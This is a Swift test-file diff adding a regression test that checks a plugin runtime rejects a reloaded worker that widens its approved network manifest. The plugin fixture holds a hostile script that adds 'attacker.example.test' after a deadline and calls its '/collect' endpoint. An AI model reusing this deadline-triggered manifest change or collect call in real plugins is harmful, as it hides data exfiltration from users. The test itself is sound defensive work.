@@ -975,6 +975,50 @@ extension ProviderPluginRuntimeTests {
         #expect(recovered.primary?.usedPercent == 7)
     }
 
+    @Test(.timeLimit(.minutes(1)), arguments: Self.labelValidationEngines)
+    func `reloaded worker cannot widen the approved manifest`(engine: ProviderPluginEngineKind) async throws {
+        // The script declares a second origin only when it is evaluated after the deadline.
+        let deadline = Date().addingTimeInterval(5)
+        let deadlineMillis = Int(deadline.timeIntervalSince1970 * 1000)
+        let (starts, signalStart) = AsyncStream<Void>.makeStream()
+        let requestedHosts = RequestedHosts()
+        let runtime = try ProviderPluginRuntime(
+            source: Self.plugin(
+                endpoints: """
+                Date.now() > \(deadlineMillis)
+                  ? ["https://api.example.test", "https://attacker.example.test"]
+                  : ["https://api.example.test"]
+                """,
+                fetchBody: """
+                if (ctx.settings.getSecret("TEST_KEY") === "hang") {
+                  await ctx.http.getJSON("https://api.example.test/slow");
+                }
+                await ctx.http.getJSON("https://attacker.example.test/collect");
+                return { primary: { usedPercent: 7 } };
+                """),
+            transport: ProviderHTTPTransportHandler { request in
+                requestedHosts.append(request.url?.host ?? "")
+                signalStart.yield()
+                try await Task.sleep(for: .seconds(60))
+                throw URLError(.cancelled)
+            },
+            engine: engine)
+        let approved: Set<ProviderPluginEndpoint> = [.fixed("https://api.example.test")]
+        try #require(runtime.manifest.endpoints == approved)
+
+        let fetch = Task { try await runtime.fetchUsage(secrets: ["TEST_KEY": "hang"]) }
+        var iterator = starts.makeAsyncIterator()
+        await iterator.next()
+        fetch.cancel()
+        await #expect(throws: CancellationError.self) { try await fetch.value }
+        try await Task.sleep(for: .seconds(max(0, deadline.timeIntervalSinceNow) + 0.25))
+
+        await #expect(throws: ProviderPluginError.load("reloaded plugin changed its manifest")) {
+            _ = try await runtime.fetchUsage(secrets: ["TEST_KEY": "ok"])
+        }
+        #expect(requestedHosts.values == ["api.example.test"])
+    }
+
     #if canImport(JavaScriptCore)
     @Test
     func `JSC pending script times out and next fetch uses a fresh context`() async throws {
@@ -1124,5 +1168,18 @@ private actor RequestRecorder {
 
     func append(_ request: URLRequest) {
         self.requests.append(request)
+    }
+}
+
+private final class RequestedHosts: @unchecked Sendable {
+    private let lock = NSLock()
+    private var hosts: [String] = []
+
+    var values: [String] {
+        self.lock.withLock { self.hosts }
+    }
+
+    func append(_ host: String) {
+        self.lock.withLock { self.hosts.append(host) }
     }
 }
